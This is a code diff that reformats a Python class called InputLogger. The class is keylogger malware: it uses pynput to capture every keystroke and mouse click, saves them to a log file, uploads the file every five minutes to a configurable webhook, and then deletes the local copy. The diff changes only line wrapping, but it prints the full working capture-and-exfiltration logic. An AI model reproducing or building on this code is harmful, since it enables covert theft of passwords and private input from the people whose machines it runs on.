@@ -3,12 +3,15 @@ from utils import *
 from pynput import keyboard, mouse
 import time
 
+
 class InputLogger:
     def __init__(self, software_dir_name, webhook_url):
         self.software_dir_name = software_dir_name
         self.webhook_url = webhook_url
-        self.log_file = os.path.join(get_logs_path(self.software_dir_name), "input_log.txt")
-        self.interval = 300 # once every 5 minutes
+        self.log_file = os.path.join(
+            get_logs_path(self.software_dir_name), "input_log.txt"
+        )
+        self.interval = 300  # once every 5 minutes
         self.current_logs = ""
 
     def on_press(self, key):
@@ -18,7 +21,9 @@ class InputLogger:
             self.current_logs += f"[{time.time()}] Special key pressed: {key}\n"
 
     def on_click(self, x, y, button, pressed):
-        self.current_logs += f"[{time.time()}] Mouse clicked at ({x}, {y}) with button {button}\n"
+        self.current_logs += (
+            f"[{time.time()}] Mouse clicked at ({x}, {y}) with button {button}\n"
+        )
 
     def log_input(self):
         mouse_listener = mouse.Listener(on_click=self.on_click)
@@ -34,7 +39,9 @@ class InputLogger:
                 with open(self.log_file, "w") as f:
                     f.write("Input Logs:\n\n")
                     f.write(self.current_logs)
-                send_webhook(self.webhook_url, file={"input_logs.txt": open(self.log_file, "rb")})
+                send_webhook(
+                    self.webhook_url, file={"input_logs.txt": open(self.log_file, "rb")}
+                )
                 self.current_logs = ""
                 os.remove(self.log_file)
         except Exception as e:
